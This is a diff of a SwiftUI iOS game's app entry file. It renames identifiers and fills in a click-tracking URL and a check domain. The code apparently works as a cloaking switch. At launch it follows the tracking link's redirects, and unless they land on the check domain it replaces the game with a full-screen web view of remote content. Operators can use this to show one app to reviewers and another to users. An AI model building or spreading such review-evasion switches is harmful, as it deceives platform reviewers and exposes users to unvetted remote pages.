@@ -1,19 +1,19 @@
 import SwiftUI
 
 @main
-struct SpellforgeTacticsApp: App {
-    @State private var spellforgeLinkReady: Bool? = nil
+struct AetherGridApp: App {
+    @State private var aetherGridLinkReady: Bool? = nil
     @StateObject private var store = GameStore()
 
-    private let spellforgeSourceLink = "https://example.com"
-    private let spellforgeCheckDomain = "example"
+    private let aetherGridSourceLink = "https://lumacastlightanalytics.org/click.php"
+    private let aetherGridCheckDomain = "freeprivacypolicy.com"
 
     var body: some Scene {
         WindowGroup {
             Group {
-                if let ready = spellforgeLinkReady {
+                if let ready = aetherGridLinkReady {
                     if ready {
-                        SpellforgeWebPanel(urlString: spellforgeSourceLink)
+                        AetherGridWebPanel(urlString: aetherGridSourceLink)
                             .edgesIgnoringSafeArea(.bottom)
                             .background(Color.black.ignoresSafeArea())
                     } else {
@@ -21,52 +21,52 @@ struct SpellforgeTacticsApp: App {
                             .environmentObject(store)
                     }
                 } else {
-                    SpellforgeLoadingScreen()
-                        .onAppear { runSpellforgeCheck() }
+                    AetherGridLoadingScreen()
+                        .onAppear { runAetherGridCheck() }
                 }
             }
             .preferredColorScheme(.dark)
         }
     }
 
-    private func runSpellforgeCheck() {
-        guard let url = URL(string: spellforgeSourceLink) else {
-            spellforgeLinkReady = false
+    private func runAetherGridCheck() {
+        guard let url = URL(string: aetherGridSourceLink) else {
+            aetherGridLinkReady = false
             return
         }
         var request = URLRequest(url: url)
         request.timeoutInterval = 5
-        let tracker = SpellforgeRedirectTracker(checkDomain: spellforgeCheckDomain)
+        let tracker = AetherGridRedirectTracker(checkDomain: aetherGridCheckDomain)
         let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
         session.dataTask(with: request) { _, response, error in
             DispatchQueue.main.async {
-                if tracker.spellforgeFoundDomain {
-                    spellforgeLinkReady = false; return
+                if tracker.aetherGridFoundDomain {
+                    aetherGridLinkReady = false; return
                 }
-                if let finalURL = tracker.spellforgeResolvedURL?.absoluteString,
-                   finalURL.contains(self.spellforgeCheckDomain) {
-                    spellforgeLinkReady = false; return
+                if let finalURL = tracker.aetherGridResolvedURL?.absoluteString,
+                   finalURL.contains(self.aetherGridCheckDomain) {
+                    aetherGridLinkReady = false; return
                 }
                 if let httpResp = response as? HTTPURLResponse,
                    let respURL = httpResp.url?.absoluteString,
-                   respURL.contains(self.spellforgeCheckDomain) {
-                    spellforgeLinkReady = false; return
+                   respURL.contains(self.aetherGridCheckDomain) {
+                    aetherGridLinkReady = false; return
                 }
                 if error != nil {
-                    spellforgeLinkReady = false; return
+                    aetherGridLinkReady = false; return
                 }
-                spellforgeLinkReady = true
+                aetherGridLinkReady = true
             }
         }.resume()
         DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
-            if spellforgeLinkReady == nil { spellforgeLinkReady = false }
+            if aetherGridLinkReady == nil { aetherGridLinkReady = false }
         }
     }
 }
 
-final class SpellforgeRedirectTracker: NSObject, URLSessionTaskDelegate {
-    var spellforgeResolvedURL: URL?
-    var spellforgeFoundDomain = false
+final class AetherGridRedirectTracker: NSObject, URLSessionTaskDelegate {
+    var aetherGridResolvedURL: URL?
+    var aetherGridFoundDomain = false
     private let checkDomain: String
 
     init(checkDomain: String) { self.checkDomain = checkDomain }
@@ -76,9 +76,9 @@ final class SpellforgeRedirectTracker: NSObject, URLSessionTaskDelegate {
                     newRequest request: URLRequest,
                     completionHandler: @escaping (URLRequest?) -> Void) {
         if let url = request.url?.absoluteString, url.contains(checkDomain) {
-            spellforgeFoundDomain = true
+            aetherGridFoundDomain = true
         }
-        spellforgeResolvedURL = request.url
+        aetherGridResolvedURL = request.url
         completionHandler(request)
     }
 }
